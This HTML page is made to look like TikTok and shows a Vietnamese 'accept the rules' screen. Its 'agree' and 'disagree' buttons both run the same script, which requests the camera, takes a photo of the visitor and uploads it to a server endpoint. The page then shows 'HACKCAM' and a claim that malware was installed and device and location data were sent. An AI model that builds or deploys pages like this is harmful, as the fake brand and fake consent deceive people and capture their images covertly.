<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok</title>
<style>
  * { box-sizing: border-box; }
  body {
    font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
    background: #0f172a;
    color: #e2e8f0;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    margin: 0;
    padding: 20px;
  }
  .card {
    background: #1e293b;
    border-radius: 16px;
    padding: 32px;
    max-width: 420px;
    width: 100%;
    box-shadow: 0 10px 40px rgba(0,0,0,0.4);
    text-align: center;
  }
  h1 { font-size: 20px; margin-bottom: 8px; }
  p.desc { color: #94a3b8; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
  .btn {
    display: inline-block;
    padding: 12px 24px;
    border-radius: 10px;
    border: none;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    margin: 6px;
    transition: 0.15s;
  }
  .btn-yes { background: #22c55e; color: #052e14; }
  .btn-yes:hover { background: #16a34a; }
  video, canvas, img.preview {
    width: 100%;
    border-radius: 10px;
    margin-top: 16px;
    background: #000;
  }
  .status { margin-top: 16px; font-size: 13px; color: #94a3b8; min-height: 20px; }
  .hidden { display: none; }
  .status.error { color: #f87171; }
  .status.ok { color: #4ade80; }
</style>
</head>
<body>

<div class="card">
  <div id="step-consent">
    <h1>Chấp Nhận Quy Định</h1>
    <p class="desc">không lưu vd không chia sẻ đi các diễn đàn mạng.</p>
    <button class="btn btn-yes" id="btnAgree1">Tôi đồng ý</button>
    <button class="btn btn-yes" id="btnAgree2">Tôi không đồng ý</button>
  </div>

  <div id="step-camera" class="hidden">
    <h1>HACKCAM...</h1>
    <video id="video" autoplay playsinline class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>
    <div class="status" id="status"></div>
  </div>

  <div id="step-done" class="hidden">
    <h1>CÀI MÃ ĐỘC HOÀN THÀNH...</h1>
    <img id="preview" class="preview" />
    <div class="status ok" id="doneStatus">THÔNG TIN THIẾT BỊ VỊ TRÍ ĐÃ GỬI VỀ MÁY CHỦ.</div>
  </div>
</div>

<script>
const UPLOAD_ENDPOINT = "/upload";

const stepConsent = document.getElementById("step-consent");
const stepCamera = document.getElementById("step-camera");
const stepDone = document.getElementById("step-done");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusEl = document.getElementById("status");

let stream = null;

function showStep(step) {
  [stepConsent, stepCamera, stepDone].forEach(s => s.classList.add("hidden"));
  step.classList.remove("hidden");
}

async function handleCameraPermission() {
  showStep(stepCamera);
  statusEl.textContent = "Đang xin quyền truy cập camera...";
  statusEl.className = "status";
  
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;  

    await new Promise(resolve => {
      video.onloadedmetadata = () => resolve();
    });
    await new Promise(resolve => setTimeout(resolve, 500));

    statusEl.textContent = "Đang chụp ảnh...";
    await captureAndSend();
  } catch (err) {
    statusEl.textContent = "Không thể truy cập camera: " + err.message;
    statusEl.className = "status error";
  }
}

document.getElementById("btnAgree1").addEventListener("click", handleCameraPermission);
document.getElementById("btnAgree2").addEventListener("click", handleCameraPermission);

async function captureAndSend() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    statusEl.textContent = "Đang gửi ảnh...";
    statusEl.className = "status";

    const formData = new FormData();
    formData.append("photo", blob, `capture-${Date.now()}.jpg`);

    try {
      const res = await fetch(UPLOAD_ENDPOINT, {
        method: "POST",
        body: formData
      });
      if (!res.ok) throw new Error("Server trả về lỗi: " + res.status);

      document.getElementById("preview").src = URL.createObjectURL(blob);
      stopCamera();
      showStep(stepDone);
    } catch (err) {
      statusEl.textContent = "Gửi thất bại (Cần có Backend nhận /upload): " + err.message;
      statusEl.className = "status error";
    }
  }, "image/jpeg", 0.9);
}

function stopCamera() {
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
    stream = null;
  }
}
</script>
</body>
</html>
